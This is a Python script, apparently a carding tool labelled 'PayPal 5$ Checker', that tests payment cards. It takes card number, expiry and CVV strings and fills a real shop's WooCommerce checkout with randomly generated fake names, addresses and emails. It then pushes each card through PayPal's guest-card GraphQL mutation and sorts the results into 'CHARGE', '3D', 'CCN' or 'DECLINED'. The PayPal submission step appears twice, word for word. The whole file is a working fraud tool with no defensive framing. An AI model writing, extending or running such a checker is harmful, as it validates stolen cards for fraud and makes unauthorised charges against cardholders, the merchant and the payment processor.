import requests
import re
import time
import random
import string
import base64
from bs4 import BeautifulSoup
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder

# ======================================================
# PayPal 5$ Checker (converted to function)
# ======================================================
def process_card_paypal5(card: str):
    try:
        # ---------------- Parse card ---------------- #
        parts = re.split(r'[|:/]', card.strip())
        if len(parts) < 4:
            return False, f"{card} → Invalid card format ❌"
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(mm) == 1:
            mm = f"0{mm}"
        if "20" in yy:
            yy = yy.split("20")[1]

        # ---------------- Generate fake data ---------------- #
        def generate_full_name():
            first_names = [
                "Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"
            ]
            last_names = [
                "Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"
            ]
            full_name = random.choice(first_names) + " " + random.choice(last_names)
            first_name, last_name = full_name.split()
            return first_name, last_name

        def generate_address():
            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
            states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
            streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
            zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
            city = random.choice(cities)
            state = states[cities.index(city)]
            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
            zip_code = zip_codes[states.index(state)]
            return city, state, street_address, zip_code

        def generate_random_account():
            name = ''.join(random.choices(string.ascii_lowercase, k=20))
            number = ''.join(random.choices(string.digits, k=4))
            return f"{name}{number}@gmail.com"

        def generate_phone():
            number = ''.join(random.choices(string.digits, k=7))
            return f"303{number}"

        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_account()
        phone = generate_phone()

        ua = user_agent.generate_user_agent()
        r = requests.Session()
        # ===================== Step 1: Add to cart =====================
        files = {
            'quantity': (None, '1'),
            'add-to-cart': (None, '4451'),
        }
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'content-type': multipart_data.content_type,
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }
        r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)

        # ===================== Step 2: Checkout =====================
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en;q=0.7,en-US;q=0.6',
            'cache-control': 'max-age=0',
            'referer': 'https://switchupcb.com/cart/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }
        response = r.get('https://switchupcb.com/checkout/', headers=headers)

        try:
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
        except:
            return False, f"{card} → Failed to extract nonces ❌"
        # ===================== Step 3: Update order review =====================
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&woocommerce-process-checkout-nonce={check}'
        r.post('https://switchupcb.com/', params=params, headers=headers, data=data)

        # ===================== Step 4: Create PayPal order =====================
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'wc-ajax': 'ppc-create-order'}
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&payment_method=ppcp-gateway&terms=on&woocommerce-process-checkout-nonce={check}',
            'createaccount': False,
            'save_payment_method': False,
        }
        response = r.post('https://switchupcb.com/', params=params, headers=headers, json=json_data)

        try:
            order_id = response.json()['data']['id']
        except:
            return False, f"{card} → Failed to create PayPal order ❌"
        # ===================== Step 5: PayPal GraphQL =====================
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/checkoutnow?token=' + order_id,
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }
        json_data = {
            'query': '''
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                        }
                    }
                }
            }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'type': 'MASTER_CARD',
                    'expirationDate': f"{mm}/20{yy}",
                    'postalCode': zip_code,
                    'securityCode': cvv,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': email,
                'currencyConversionType': 'VENDOR',
            },
        }
        response = requests.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            headers=headers,
            json=json_data,
        )

        last = response.text
        # ===================== Step 5: PayPal GraphQL =====================
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/checkoutnow?token=' + order_id,
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }
        json_data = {
            'query': '''
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                        }
                    }
                }
            }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'type': 'MASTER_CARD',
                    'expirationDate': f"{mm}/20{yy}",
                    'postalCode': zip_code,
                    'securityCode': cvv,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': email,
                'currencyConversionType': 'VENDOR',
            },
        }
        response = requests.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            headers=headers,
            json=json_data,
        )

        last = response.text
        # ===================== Final Response Handling =====================
        if ('ADD_SHIPPING_ERROR' in last or
            '"status": "succeeded"' in last or
            'Thank You For Donation.' in last or
            'Your payment has already been processed' in last or
            'Success' in last):
            return True, f"{card} → CHARGE 5$ ✅"

        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return True, f"{card} → APPROVED 3D [OTP] ✅"

        elif 'INVALID_SECURITY_CODE' in last:
            return True, f"{card} → CCN ✅"

        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return True, f"{card} → EXISTING_ACCOUNT_RESTRICTED 🌠"

        elif 'INVALID_BILLING_ADDRESS' in last:
            return True, f"{card} → INVALID_BILLING_ADDRESS ⚡"

        else:
            return False, f"{card} → DECLINED ❌"

    except Exception as e:
        return False, f"{card} → Error: {e}"